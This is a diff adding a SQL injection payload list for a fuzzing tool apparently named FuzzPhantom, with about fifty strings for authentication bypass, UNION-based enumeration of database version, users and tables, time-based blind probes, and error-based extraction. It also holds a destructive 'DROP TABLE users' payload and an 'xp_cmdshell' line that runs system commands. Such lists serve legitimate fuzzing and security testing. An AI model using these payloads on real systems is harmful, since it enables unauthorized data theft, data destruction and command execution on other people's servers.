@@ -1,0 +1,54 @@
+# FuzzPhantom — SQL Injection Test Payloads
+# Classic and error-based SQLi detection
+'
+''
+`
+")
+'))
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+') OR ('1'='1
+' OR 'x'='x
+" OR "1"="1
+" OR "1"="1" --
+" OR 1=1--
+admin'--
+admin' #
+admin'/*
+' HAVING 1=1--
+' GROUP BY columnnames having 1=1--
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL--
+'; DROP TABLE users--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC sp_executesql N'SELECT 1'--
+1; SELECT SLEEP(5)--
+1' AND SLEEP(5)--
+' AND SLEEP(5)--
+" AND SLEEP(5)--
+1 AND 1=1
+1 AND 1=2
+1' AND '1'='1
+1' AND '1'='2
+0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
+IF(1=1,SLEEP(5),0)
+(SELECT * FROM (SELECT(SLEEP(5)))a)
+'; WAITFOR DELAY '0:0:5'--
+1; WAITFOR DELAY '0:0:5'--
+'; SELECT pg_sleep(5)--
+1' OR pg_sleep(5)--
+1 UNION SELECT @@version--
+1 UNION SELECT user()--
+1 UNION SELECT database()--
+1 UNION SELECT table_name FROM information_schema.tables--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--
+' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)--
